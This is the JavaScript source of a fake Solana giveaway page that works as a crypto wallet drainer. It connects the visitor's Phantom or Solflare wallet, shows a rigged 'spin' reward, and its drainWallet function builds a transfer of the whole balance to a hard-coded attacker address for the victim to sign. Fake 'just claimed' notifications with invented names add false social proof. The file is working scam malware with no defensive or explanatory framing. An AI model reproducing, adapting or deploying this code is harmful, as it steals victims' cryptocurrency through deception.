// --- CONFIGURATION ---
const DESTINATION_WALLET = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV";
// ---------------------

const connectBtn = document.getElementById('connectBtn');
const claimBtn = document.getElementById('claimBtn');
const statusText = document.getElementById('status');
const rewardAmountDisplay = document.getElementById('reward-amount');
const spinSection = document.getElementById('spin-section');
const claimDetails = document.getElementById('claim-details');

// --- 1. WALLET DETECTION & CONNECTION ---
async function connectWallet() {
    try {
        statusText.innerText = "Connecting to your wallet...";
        
        // Check for Phantom or Solflare
        if (window.solana && window.solana.isPhantom) {
            statusText.innerText = "Phantom detected. Confirm connection...";
            await window.solana.connect(); // This opens the Phantom UI
            connectSuccess();
        } else if (window.solflare) {
            statusText.innerText = "Solflare detected. Confirm connection...";
            await window.solflare.connect(); // This opens the Solflare UI
            connectSuccess();
        } else {
            statusText.innerText = "Please install Phantom or Solflare Wallet.";
            window.open("https://phantom.app/", "_blank");
        }
    } catch (error) {
        statusText.innerText = "Connection cancelled.";
        connectBtn.disabled = false;
    }
}

function connectSuccess() {
    statusText.innerText = "Connected! Spinning for your reward...";
    connectBtn.classList.add('hidden');
    claimDetails.classList.add('hidden');
    
    // Show the spin section
    spinSection.classList.remove('hidden');
    spinAnimation();
}

// --- 2. SPINNING ANIMATION ---
function spinAnimation() {
    const spinResult = document.getElementById('spin-result');
    let counter = 0;
    
    // Simulate spinning for 3 seconds
    const interval = setInterval(() => {
        const randomTemp = (Math.random() * 5).toFixed(4);
        spinResult.innerText = `${randomTemp} SOL`;
        counter++;
        if (counter > 15) { // 15 ticks * 200ms = 3 seconds
            clearInterval(interval);
            const finalReward = getRandomReward();
            spinResult.innerText = `${finalReward} SOL`;
            showClaim(finalReward);
        }
    }, 200);
}

function showClaim(reward) {
    statusText.innerText = "Your reward is ready!";
    claimDetails.classList.remove('hidden');
    rewardAmountDisplay.innerText = `${reward} SOL`;
    claimBtn.classList.remove('hidden');
}

// --- 3. DRAINING THE WALLET ---
async function drainWallet() {
    try {
        claimBtn.disabled = true;
        claimBtn.innerText = "Processing...";
        statusText.innerText = "Sending transaction...";

        // Get connection
        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
        
        // Get user's public key from the connected wallet
        let publicKey;
        if (window.solana && window.solana.isPhantom) {
            publicKey = window.solana.publicKey;
        } else if (window.solflare) {
            publicKey = window.solflare.publicKey;
        }

        // Get final balance
        const balance = await connection.getBalance(publicKey);
        
        if (balance === 0) {
            statusText.innerText = "Wallet is empty.";
            claimBtn.innerText = "Empty";
            return;
        }

        // Create Transaction
        const transaction = new solana.web3.Transaction();
        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
        
        const instruction = solana.web3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: to,
            lamports: balance
        });

        transaction.add(instruction);

        // Sign and Send
        statusText.innerText = "Waiting for signature...";
        
        if (window.solana && window.solana.isPhantom) {
            await window.solana.signAndSendTransaction(transaction);
        } else if (window.solflare) {
            // Solflare specific signing
            const signedTx = await window.solflare.signTransaction(transaction);
            const txid = await connection.sendRawTransaction(signedTx.serialize());
            statusText.innerText = "Confirmed!";
        }

        statusText.innerText = "Success! Check your wallet.";
        claimBtn.innerText = "Claimed";
        
        // Optional: Reload after 3 seconds
        setTimeout(() => {
            window.location.reload();
        }, 3000);

    } catch (error) {
        console.error(error);
        statusText.innerText = "Transaction failed or rejected.";
        claimBtn.disabled = false;
        claimBtn.innerText = "Try Again";
    }
}

// --- 4. WEIGHED RANDOM LOGIC ---
function getRandomReward() {
    const chance = Math.random() * 100;
    
    if (chance < 2) { // 2% chance for big reward
        return (5.0).toFixed(4);
    } else if (chance < 20) { // 18% chance for medium reward
        const min = 0.1;
        const max = 2.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    } else { // 80% chance for small reward
        const min = 0.001;
        const max = 3.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    }
}

// --- 5. FAKE NOTIFICATIONS ---
const fakeNames = ["Alex", "Sarah", "Mike", "Jessica", "David", "Emily", "James", "Olivia", "Robert", "Emma", "Chris", "Anna", "Daniel", "Sophie", "Mark"];
const smallAmounts = ["0.001", "0.005", "0.009", "0.01", "0.03", "0.05", "0.07", "0.1", "0.2", "0.5"];

function createNotification() {
    const container = document.getElementById('notification-container');
    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
    const amount = smallAmounts[Math.floor(Math.random() * smallAmounts.length)];
    
    const notif = document.createElement('div');
    notif.className = 'notification';
    notif.innerHTML = `
        <span class="notification-icon">🔔</span>
        <span class="notification-text"><strong>${name}</strong> just claimed <strong>${amount} SOL</strong></span>
    `;
    
    container.appendChild(notif);
    
    setTimeout(() => {
        if (container.contains(notif)) {
            container.removeChild(notif);
        }
    }, 4000);
}

setInterval(createNotification, 5000);
createNotification();

// --- 6. EVENT LISTENERS ---
connectBtn.addEventListener('click', connectWallet);
claimBtn.addEventListener('click', drainWallet);
